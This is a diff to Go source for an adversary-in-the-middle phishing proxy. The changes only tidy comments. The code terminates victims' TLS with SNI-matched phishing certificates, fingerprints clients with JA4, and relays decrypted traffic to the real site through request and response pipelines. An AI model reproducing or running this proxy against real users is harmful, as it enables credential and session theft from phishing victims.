@@ -68,22 +68,14 @@ func (p *AITMProxy) Start(ctx context.Context, addr string) error {
 	}
 }
 
-// handleConn is the per-connection goroutine.
-// Flow:
-//  1. Wrap in PeekedConn to capture raw ClientHello bytes for JA4.
-//  2. Complete TLS handshake — GetCertificate uses the SNI hostname from the
-//     ClientHello to select the right phishing certificate.
-//  3. Allocate a ProxyContext for this connection.
-//  4. Serve HTTP/1.1 over the decrypted connection via serveDecrypted().
+// handleConn runs per-connection: captures ClientHello for JA4, completes TLS
+// handshake with the SNI-matched cert, then serves HTTP/1.1 via serveDecrypted.
 func (p *AITMProxy) handleConn(rawConn net.Conn) {
 	defer rawConn.Close()
 
-	// Wrap in PeekedConn to tee the first TLS record before the handshake
-	// consumes it. This gives us the raw ClientHello bytes for JA4 computation.
+	// Tee the first TLS record so JA4 can be computed from the raw ClientHello.
 	peeked := NewPeekedConn(rawConn)
 
-	// Complete the TLS handshake. crypto/tls calls GetCertificate with the
-	// SNI hostname from the ClientHello, so we present the right cert per host.
 	// GetConfigForClient applies mTLS only for the secret management hostname,
 	// so phishing victims are never prompted for a client certificate.
 	tlsConfig := &tls.Config{
@@ -110,7 +102,6 @@ func (p *AITMProxy) handleConn(rawConn net.Conn) {
 	}
 	defer tlsConn.Close()
 
-	// Allocate a ProxyContext for this connection.
 	pctx := &aitm.ProxyContext{
 		RequestID:        newRequestID(),
 		ClientHelloBytes: peeked.ClientHelloBytes(),
@@ -119,14 +110,12 @@ func (p *AITMProxy) handleConn(rawConn net.Conn) {
 	p.serveDecrypted(pctx, tlsConn)
 }
 
-// serveDecrypted reads HTTP requests from the decrypted connection, runs the
-// request pipeline, forwards to upstream if not short-circuited, runs the
-// response pipeline, and writes the response back.
+// serveDecrypted is the HTTP/1.1 keep-alive loop over a decrypted connection.
 func (p *AITMProxy) serveDecrypted(pctx *aitm.ProxyContext, conn net.Conn) {
 	connReader := bufio.NewReader(conn)
 
-	// http.ReadRequest never populates req.TLS; capture it once per connection
-	// so authMiddleware can verify the client certificate on management requests.
+	// http.ReadRequest never populates req.TLS, so capture it once per connection
+	// for the API auth middleware to inspect the client certificate.
 	var tlsState *tls.ConnectionState
 	if tlsConn, ok := conn.(*tls.Conn); ok {
 		cs := tlsConn.ConnectionState()
@@ -144,7 +133,6 @@ func (p *AITMProxy) serveDecrypted(pctx *aitm.ProxyContext, conn net.Conn) {
 		req.TLS = tlsState
 		req.URL.Scheme = "https"
 
-		// Check for WebSocket upgrade to the hub endpoint.
 		if isWebSocketUpgrade(req) && strings.HasPrefix(req.URL.Path, "/ws/") {
 			sessionID := strings.TrimPrefix(req.URL.Path, "/ws/")
 			if sessionID == "" {
@@ -156,11 +144,9 @@ func (p *AITMProxy) serveDecrypted(pctx *aitm.ProxyContext, conn net.Conn) {
 			return
 		}
 
-		// Wrap conn as a ResponseWriter so short-circuiting handlers can respond.
 		rec := newBufferedResponseWriter(conn)
 		pctx.ResponseWriter = rec
 
-		// Run the request pipeline.
 		if err := p.Pipeline.RunRequest(pctx, req); err != nil {
 			if errors.Is(err, ErrShortCircuit) {
 				rec.flush()
@@ -174,17 +160,14 @@ func (p *AITMProxy) serveDecrypted(pctx *aitm.ProxyContext, conn net.Conn) {
 			return
 		}
 
-		// Forward to upstream, run response pipeline, write back.
-		// Returns false when the connection should be closed.
 		if !p.serveOneRequest(pctx, req, conn, rec) {
 			return
 		}
 	}
 }
 
-// serveOneRequest forwards req upstream, runs the response pipeline, and writes
-// the response back to the client. Returns true if the connection should stay
-// alive for the next request.
+// serveOneRequest forwards one request upstream and writes the response back.
+// Returns true if the connection should stay alive.
 func (p *AITMProxy) serveOneRequest(pctx *aitm.ProxyContext, req *http.Request, conn net.Conn, rec *bufferedResponseWriter) bool {
 	resp, err := p.forwardRequest(req)
 	if err != nil {
@@ -206,7 +189,6 @@ func (p *AITMProxy) serveOneRequest(pctx *aitm.ProxyContext, req *http.Request, 
 	return !req.Close && !resp.Close
 }
 
-// forwardRequest sends req to the upstream origin and returns the response.
 func (p *AITMProxy) forwardRequest(req *http.Request) (*http.Response, error) {
 	transport := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: false},
@@ -220,11 +202,10 @@ func (p *AITMProxy) forwardRequest(req *http.Request) (*http.Response, error) {
 	client := &http.Client{
 		Transport: transport,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse // don't follow redirects; let victim's browser do it
+			return http.ErrUseLastResponse // victim's browser handles redirects
 		},
 	}
 
-	// Clone the request for the upstream.
 	upstreamReq := req.Clone(req.Context())
 	upstreamReq.RequestURI = ""
 	if upstreamReq.URL.Host == "" {
@@ -236,7 +217,7 @@ func (p *AITMProxy) forwardRequest(req *http.Request) (*http.Response, error) {
 		return nil, fmt.Errorf("upstream request: %w", err)
 	}
 
-	// Tag the response with the original request for sub-filter hostname matching.
+	// Tag with the original request so sub-filter hostname matching works.
 	resp.Request = req
 	return resp, nil
 }
